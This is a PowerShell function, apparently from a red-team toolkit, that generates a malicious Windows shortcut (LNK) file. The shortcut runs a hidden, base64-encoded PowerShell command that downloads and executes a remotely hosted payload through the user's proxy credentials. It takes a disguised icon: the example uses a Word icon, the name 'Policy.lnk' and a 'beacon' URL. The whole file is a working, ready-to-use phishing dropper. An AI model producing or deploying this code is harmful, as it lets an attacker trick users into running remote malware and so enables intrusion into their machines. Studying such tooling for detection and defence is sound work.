function Create-LNKPayload{
<#
    .SYNOPSIS

        Generates a malicous LNK file

    .PARAMETER LNKName

        Name of the LNK file you want to create. 

    .PARAMETER TargetPath

        Path to the exe you want to execute. Defaults to powershell.

    .PARAMETER IconPath

        Path to an exe for an icon. Defaults to Internet Explorer.

    .PARAMETER HostedPayload

        URL/URI to hosted PowerShell payload.

   
   .EXAMPLE

        Create-LNKPayload -LNKName 'C:\Users\user\Desktop\Policy.lnk' -IconPath 'C:\Program Files (x86)\Microsoft Office\root\Office16\winword.exe,1' -HostedPayload 'http://192.168.1.204/beacon'

        Creates a LNK named "Policy" with the 2nd available icon in the Word executable and then executes powershell code hosted at 'beacon'
    
#>
    [CmdletBinding(DefaultParameterSetName = 'None')]
    param(

    [Parameter(Mandatory=$True)]
        [String]
        $LNKName,

        [Parameter()]
        [String]
        $TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",

        [Parameter()]
        $IconPath = 'C:\Program Files\Internet Explorer\iexplore.exe',

        [Parameter(Mandatory=$True)]
        [String]
        $HostedPayload

    )

     if($LNKName -notlike "*.lnk"){
        $LNKName = '\' + $LNKName + ".lnk"
     }elseif($LNKName -notlike 'C:\*'){
        $LNKName = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('.\') + '\' + $LNKName
     }

     $payload = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$HostedPayload'))"
     $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
     $finalPayload = "-nop -WindowStyle Hidden -enc $encodedPayload"
     $obj = New-Object -ComObject WScript.Shell
     $link = $obj.CreateShortcut($LNKName)
     $link.WindowStyle = '7'
     $link.TargetPath = $TargetPath
     $link.IconLocation = $IconPath
     $link.Arguments = $finalPayload
     $link.Save()
}